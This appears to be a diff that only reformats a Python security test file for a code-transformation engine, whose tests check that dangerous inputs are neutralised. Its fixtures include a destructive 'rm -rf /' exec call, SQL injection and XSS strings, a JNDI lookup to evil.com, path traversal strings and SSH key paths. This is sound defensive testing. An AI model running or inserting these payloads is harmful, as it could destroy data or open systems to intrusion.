@@ -20,16 +20,15 @@ class TestBasicSecurity:
     def test_safe_code_processing(self):
         """Test that safe code is processed correctly"""
 
-        safe_code = '''
+        safe_code = """
 def safe_function(x: int) -> int:
     result = x + 42
     print(f"Result: {result}")
     return result
-'''
+"""
 
         config = InjectionConfig(
-            enabled_patterns={PatternType.KINDA_INT, PatternType.SORTA_PRINT},
-            safety_level="safe"
+            enabled_patterns={PatternType.KINDA_INT, PatternType.SORTA_PRINT}, safety_level="safe"
         )
 
         result = self.engine.inject_source(safe_code, config, "safe_test")
@@ -38,30 +37,27 @@ def safe_function(x: int) -> int:
     def test_malicious_code_handling(self):
         """Test handling of potentially malicious code"""
 
-        malicious_code = '''
+        malicious_code = """
 def malicious_function():
     import os
     exec("os.system('rm -rf /')")
     return 42
-'''
+"""
 
-        config = InjectionConfig(
-            enabled_patterns={PatternType.KINDA_INT},
-            safety_level="safe"
-        )
+        config = InjectionConfig(enabled_patterns={PatternType.KINDA_INT}, safety_level="safe")
 
         result = self.engine.inject_source(malicious_code, config, "malicious_test")
 
         # Should either fail or sanitize the dangerous code
         if result.success:
             # If successful, verify dangerous constructs are removed/neutralized
-            assert 'exec(' not in result.transformed_code
-            assert 'os.system' not in result.transformed_code
+            assert "exec(" not in result.transformed_code
+            assert "os.system" not in result.transformed_code
 
     def test_decorator_safety(self):
         """Test that decorators handle potentially unsafe code"""
 
-        @enhance(patterns=['kinda_int'], safety_level='safe')
+        @enhance(patterns=["kinda_int"], safety_level="safe")
         def test_function(x: int) -> int:
             # This should be safe
             return x * 2
@@ -77,20 +73,17 @@ def malicious_function():
             "'; DROP TABLE users; --",
             "<script>alert('xss')</script>",
             "../../etc/passwd",
-            "${jndi:ldap://evil.com/a}"
+            "${jndi:ldap://evil.com/a}",
         ]
 
         for dangerous_input in dangerous_inputs:
-            code = f'''
+            code = f"""
 def process_input():
     user_input = "{dangerous_input}"
     return len(user_input)
-'''
+"""
 
-            config = InjectionConfig(
-                enabled_patterns={PatternType.KINDA_INT},
-                safety_level="safe"
-            )
+            config = InjectionConfig(enabled_patterns={PatternType.KINDA_INT}, safety_level="safe")
 
             result = self.engine.inject_source(code, config, "input_test")
 
@@ -100,25 +93,17 @@ def process_input():
     def test_file_path_security(self):
         """Test security of file path handling"""
 
-        suspicious_paths = [
-            "/etc/passwd",
-            "../../../secret.txt",
-            "~/.ssh/id_rsa",
-            "/proc/version"
-        ]
+        suspicious_paths = ["/etc/passwd", "../../../secret.txt", "~/.ssh/id_rsa", "/proc/version"]
 
         for path in suspicious_paths:
-            code = f'''
+            code = f"""
 def file_operation():
     file_path = "{path}"
     # Simulate file access
     return file_path
-'''
+"""
 
-            config = InjectionConfig(
-                enabled_patterns={PatternType.KINDA_INT},
-                safety_level="safe"
-            )
+            config = InjectionConfig(enabled_patterns={PatternType.KINDA_INT}, safety_level="safe")
 
             result = self.engine.inject_source(code, config, "file_test")
 
@@ -128,28 +113,24 @@ def file_operation():
     def test_safety_levels(self):
         """Test different safety levels"""
 
-        borderline_code = '''
+        borderline_code = """
 def borderline_function():
     import json
     import os
     config_path = os.path.join(".", "config.json")
     return config_path
-'''
+"""
 
         # Should work in risky mode
         risky_config = InjectionConfig(
-            enabled_patterns={PatternType.KINDA_INT},
-            safety_level="risky"
+            enabled_patterns={PatternType.KINDA_INT}, safety_level="risky"
         )
 
         risky_result = self.engine.inject_source(borderline_code, risky_config, "risky_test")
         # In risky mode, should generally succeed
 
         # May be more restrictive in safe mode
-        safe_config = InjectionConfig(
-            enabled_patterns={PatternType.KINDA_INT},
-            safety_level="safe"
-        )
+        safe_config = InjectionConfig(enabled_patterns={PatternType.KINDA_INT}, safety_level="safe")
 
         safe_result = self.engine.inject_source(borderline_code, safe_config, "safe_test")
         # Could succeed or fail in safe mode - both are acceptable
@@ -157,20 +138,17 @@ def borderline_function():
     def test_injection_isolation(self):
         """Test that injections don't interfere with each other"""
 
-        code1 = '''
+        code1 = """
 def function1():
     return 42
-'''
+"""
 
-        code2 = '''
+        code2 = """
 def function2():
     return 84
-'''
+"""
 
-        config = InjectionConfig(
-            enabled_patterns={PatternType.KINDA_INT},
-            safety_level="safe"
-        )
+        config = InjectionConfig(enabled_patterns={PatternType.KINDA_INT}, safety_level="safe")
 
         result1 = self.engine.inject_source(code1, config, "isolation1")
         result2 = self.engine.inject_source(code2, config, "isolation2")
@@ -193,16 +171,15 @@ def test_security_smoke_test():
     engine = InjectionEngine()
 
     # Test safe code
-    safe_code = '''
+    safe_code = """
 def safe_test():
     x = 42
     print("Safe operation")
     return x
-'''
+"""
 
     config = InjectionConfig(
-        enabled_patterns={PatternType.KINDA_INT, PatternType.SORTA_PRINT},
-        safety_level="safe"
+        enabled_patterns={PatternType.KINDA_INT, PatternType.SORTA_PRINT}, safety_level="safe"
     )
 
     result = engine.inject_source(safe_code, config, "smoke_test")
